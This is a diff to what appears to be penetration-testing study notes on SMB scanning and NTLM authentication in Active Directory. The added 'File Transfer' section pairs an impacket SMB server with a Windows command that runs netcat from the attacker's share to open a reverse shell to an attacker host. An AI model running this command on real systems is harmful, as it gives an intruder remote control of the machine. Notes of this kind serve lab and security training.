@@ -41,6 +41,18 @@
 nmap -script=smb-vuln\* -p445 $IP
 ```
 
+## File Transfer
+
+On Kali:
+```
+impacket-smbserver -smb2support Share /root/path/to/file
+```
+On Windows
+```
+cmd.exe /c //LHOST/Share/nc.exe -e cmd.exe LHOST LPORT
+```
+
+
 ## NTLM and NetNTLM
 
 New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users' identities in AD. NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM. This authentication mechanism is heavily used by the services on a network. However, services that use NetNTLM can also be exposed to the internet. The following are some of the popular examples:
